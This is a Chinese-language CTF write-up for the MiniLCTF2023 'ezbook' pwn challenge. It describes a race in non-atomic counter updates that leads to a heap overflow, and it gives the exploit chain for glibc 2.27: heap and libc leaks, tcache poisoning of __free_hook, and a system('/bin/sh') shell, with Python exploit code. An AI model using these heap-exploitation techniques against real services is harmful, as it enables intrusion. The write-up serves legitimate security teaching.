# MiniLCTF2023 - ezbook

## 题目简述

程序提供书籍的创建、查看和编辑，没有显式删除。每本书的 `title` 与 `content` 必须唯一，检查工作在线程中逐字节完成；每比较一个字符还会打开日志文件并写入多次，以故意放大竞态窗口。附件使用 glibc 2.27，二进制为 Full RELRO、Canary、NX、PIE。

漏洞来自 `book_cnt` 与 `size_cnt` 两套索引的非原子更新：异步唯一性检查失败时会回退全局 `size_cnt`，却无法保证它回退的仍是自己占用的槽，最终让某本书绑定到另一笔创建请求的较大尺寸。

## 解题过程

`create` 先执行：

```c
idx = size_cnt++;
sizes[idx] = requested_size;
buf = malloc(title_size + content_size);
pthread_create(&check, NULL, check_create, chunk);
```

检查线程发现重复项时执行 `size_cnt--` 并释放 `buf`；成功时才执行 `books[book_cnt++] = buf`。创建函数没有 `pthread_join`，所以多个检查线程可以交错。

先创建多个长达 `0x800`、只在末字节不同的书，让比较线程长时间运行。再提交一份会在末尾判定重复的长书，并趁其检查尚未结束时创建一份 `0x10 + 0x10` 的小书。慢线程失败后错误地回退 `size_cnt`，小书进入 `books` 时却可能关联到前一个 `0x800 + 0x800` 尺寸槽。之后 `edit_title` 或 `edit_content` 按错误的大尺寸向小堆块 `memcpy`，形成稳定堆溢出。

官方 exp 的后半段按 glibc 2.27 完成以下布局：

1. 用错配尺寸的 `show` 越界读取，恢复堆地址。
2. 溢出相邻 chunk 元数据，制造可控链表关系。
3. 释放较大块进入 unsorted bin，再由越界 `show` 读出 `main_arena` 指针；附件中的基址修正量为 `0x3ebca0`。
4. 污染 `0x40` tcache，使下一次对应大小的分配落到 `__free_hook`。
5. 通过一次 `create` 把 `system` 写入 `__free_hook`。
6. `edit_content` 的临时缓冲区写入 `/bin/sh\0`，函数末尾 `free(buf)` 时触发 `system("/bin/sh")`。

关键调用序列可概括为：

```python
# 先准备两个 0x250 大小的可控书块
create(0x10, 0x240, b"a" * 0x10, b"/bin/sh\0".ljust(0x240, b"a"))
create(0x10, 0x240, b"b" * 0x10, b"b" * 0x240)

# 多个慢比较请求扩大窗口
for i in range(4):
    create(0x800, 0x800,
           b"a" * 0x7ff + p8(i),
           b"a" * 0x7ff + p8(i))
    sleep(0.2)

# 重复长书会失败；紧接的小书获得错误的大尺寸
create(0x800, 0x800, b"a" * 0x7ff + b"\x03", b"a" * 0x7ff + b"\x03")
create(0x10, 0x10, b"1" * 0x10, b"1" * 0x10)

# 完成溢出、unsorted-bin 泄露与 tcache poisoning 后：
libc.address = leaked_main_arena - 0x3ebca0
edit_content(tcache_book, flat(0, 0, 0, libc.sym.__free_hook))
create(0x10, 0x30, p64(libc.sym.system), b"\0")
edit_content(shell_book, b"/bin/sh\0".ljust(0x240, b"a"))
```

竞态受调度和网络延迟影响，需要重复尝试并根据越界泄露是否合理判断成功。官方材料没有保存远程 flag 回包，不能据此补写具体 flag。

## 方法总结

锁只保护单个变量并不等于整体状态一致。本题的 `book_cnt`、`size_cnt`、`books[]` 和 `sizes[]` 分别加锁，却没有一个覆盖“预留尺寸槽—检查—提交书籍”的事务，因此失败回滚会作用到别人的状态。利用竞态时先制造可观测的尺寸错配，再把它转成传统堆溢出；后半段所有 offset 都必须绑定题目给出的 glibc 2.27。
